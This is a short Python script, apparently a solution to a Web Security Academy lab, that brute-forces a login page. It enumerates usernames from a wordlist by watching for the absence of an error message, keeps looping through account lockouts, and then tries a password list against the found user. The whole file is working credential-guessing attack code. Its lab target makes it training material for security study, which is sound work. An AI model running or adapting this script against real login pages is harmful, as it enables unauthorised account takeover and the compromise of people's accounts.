import requests
from tqdm import tqdm



def send_request(username: str, password: str) -> str:
    data = {
      'username': username,
      'password': password
    }
    response = requests.post('https://ac371faf1fa25a1bc0ae8d9700c30088.web-security-academy.net/login', data=data)
    return response.content.decode('utf-8')


def is_username_valid(response_content: str) -> bool:
    return 'Invalid username or password.' not in response_content


def is_password_valid(response_content: str) -> bool:
    return 'Invalid username or password.' not in response_content and 'too many incorrect login attempts' not in response_content


def bf_username() -> str:
    with open('../users.txt', 'r') as f:
        data = f.read().splitlines()
    while True:
        for username in tqdm(data):
            if is_username_valid(send_request(username, 'abc')):
                return username


def bf_password(username: str) -> str:
    with open('../passwords.txt', 'r') as f:
        data = f.read().splitlines()
    for password in tqdm(data):
        content = send_request(username, password)
        if is_password_valid(content):
            return password


username = bf_username()
print(username)
password = bf_password(username)
print(password)
# note that you have to wait before using the cridentials
